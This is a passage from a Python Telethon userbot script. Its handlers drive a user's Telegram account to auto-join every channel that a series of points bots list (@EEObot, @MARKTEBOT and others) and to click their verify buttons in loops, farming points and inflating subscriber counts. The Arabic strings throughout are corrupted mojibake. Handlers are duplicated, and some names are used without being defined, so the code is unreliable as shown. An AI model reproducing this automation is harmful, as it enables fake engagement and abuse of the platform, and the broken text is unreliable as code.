            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@AL2QRPBOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@AL2QRPBOT'  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ '@ŸäŸàÿ≤ÿ±_ÿßŸÑÿ®Ÿàÿ™' ÿ®ŸäŸàÿ≤ÿ± ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØŸá
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß    
    
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸàŸÉÿ±|ÿ™ÿ¨ŸÖŸäÿπ ÿ¨ŸàŸÉÿ±)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿ¨ŸàŸÉÿ± , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@A_MAN9300BOT')
    await event.client.send_message('@A_MAN9300BOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@A_MAN9300BOT'  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ '@ŸäŸàÿ≤ÿ±_ÿßŸÑÿ®Ÿàÿ™' ÿ®ŸäŸàÿ≤ÿ± ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØŸá
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
   
@client.on(events.NewMessage(pattern="(ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸÑŸäÿßÿ±|.ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸÑŸäÿßÿ±)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑŸÖŸÑŸäÿßÿ± , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@EEObot')
    await event.client.send_message('@EEObot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@EEObot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@EEObot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@EEObot', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@EEObot', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿßÿ®|ÿ™ÿ¨ŸÖŸäÿπ ÿπŸÇÿßÿ®)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿπŸÇÿßÿ® , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@MARKTEBOT')
    await event.client.send_message('@MARKTEBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@MARKTEBOT'  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ '@ŸäŸàÿ≤ÿ±_ÿßŸÑÿ®Ÿàÿ™' ÿ®ŸäŸàÿ≤ÿ± ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØŸá
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸÑŸäŸàŸÜ|ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸÑŸäŸàŸÜ)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑŸÖŸÑŸäŸàŸÜ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@qweqwe1919bot')
    await event.client.send_message('@qweqwe1919bot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@qweqwe1919bot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@qweqwe1919bot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@qweqwe1919bot', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@qweqwe1919bot', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@qweqwe1919bot'  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ '@ŸäŸàÿ≤ÿ±_ÿßŸÑÿ®Ÿàÿ™' ÿ®ŸäŸàÿ≤ÿ± ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØŸá
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    

#    else:
  #      await event.edit("Ÿäÿ¨ÿ® ÿßŸÑÿØŸÅÿπ ŸÑÿßÿ≥ÿ™ÿπŸÖÿßŸÑ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± !")
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπÿ±ÿ®|ÿ™ÿ¨ŸÖŸäÿπ ÿπÿ±ÿ®)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿπÿ±ÿ® , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await l313l.get_entity(bot_username5)
    await l313l.send_message(bot_username5, '/start')
    await asyncio.sleep(4)
    msg0 = await l313l.get_messages(bot_username5, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await l313l.get_messages(bot_username5, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break

        url = msgs.reply_markup.rows[0].buttons[0].url

        try:
            try:
                await l313l(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await l313l(ImportChatInviteRequest(bott))
            msg2 = await l313l.get_messages(bot_username5, limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await l313l.get_messages(bot_username5, limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")

    await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
@client.on(events.NewMessage(pattern=".ÿ™ÿ¨ŸÖŸäÿπ ÿØÿπŸÖŸÉŸÖ"))
async def ÿ™ÿ¨ŸÖŸäÿπ_ÿØÿπŸÖŸÉŸÖ(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿØÿπŸÖŸÉŸÖ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    bot_username = '@DamKombot'
    channel_entity = await l313l.get_entity(bot_username)
    await ÿ™ÿ¨ŸÖŸäÿπ_ŸÇŸÜŸàÿßÿ™_ÿØÿπŸÖŸÉŸÖ(event, channel_entity, bot_username)

async def ÿ™ÿ¨ŸÖŸäÿπ_ŸÇŸÜŸàÿßÿ™_ÿØÿπŸÖŸÉŸÖ(event, channel_entity, bot_username):
    await l313l.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await l313l.get_messages(bot_username, limit=1)
    await msg0[0].click(1)
    await asyncio.sleep(4)
    msg1 = await l313l.get_messages(bot_username, limit=1)
    await msg1[0].click(0)
    ŸÇŸÜŸàÿßÿ™_ŸÖÿ¨ŸÖÿπÿ© = 1
    for _ in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ÿ≠ÿßŸÑŸäÿßŸã ü§ç') != -1:
            await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        msg_text = msgs.message
        if "ÿßÿ¥ÿ™ÿ±ŸÉ ŸÅÿßŸÑŸÇŸÜÿßÿ© @" in msg_text:
            ŸÇŸÜÿßÿ© = msg_text.split('@')[1].split()[0]
            try:
                entity = await l313l.get_entity(ŸÇŸÜÿßÿ©)
                if entity:
                    await l313l(JoinChannelRequest(entity.id))
                    await asyncio.sleep(4)
                    msg2 = await l313l.get_messages(bot_username, limit=1)
                    await msg2[0].click(text='ÿßÿ¥ÿ™ÿ±ŸÉÿ™ ‚úÖ')
                    ŸÇŸÜŸàÿßÿ™_ŸÖÿ¨ŸÖÿπÿ© += 1
                    await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∏ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {ŸÇŸÜŸàÿßÿ™_ŸÖÿ¨ŸÖÿπÿ©}")
            except Exception as e:
                await l313l.send_message(event.chat_id, f"**ÿÆÿ∑ÿ£ , ŸÖŸÖŸÉŸÜ ÿ™ÿ®ŸÜÿØÿ™** {str(e)}")
                break
    await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
               
@client.on(events.NewMessage(pattern="(ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿßÿ≥ÿßÿ≥ŸäŸÑ|.ÿ™ÿ¨ŸÖŸäÿπ ÿßÿ≥ÿßÿ≥ŸäŸÑ)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßÿ≥ÿßÿ≥ŸäŸÑ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@yynnurybot')
    await event.client.send_message('@yynnurybot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@yynnurybot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@yynnurybot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@yynnurybot', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@yynnurybot', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
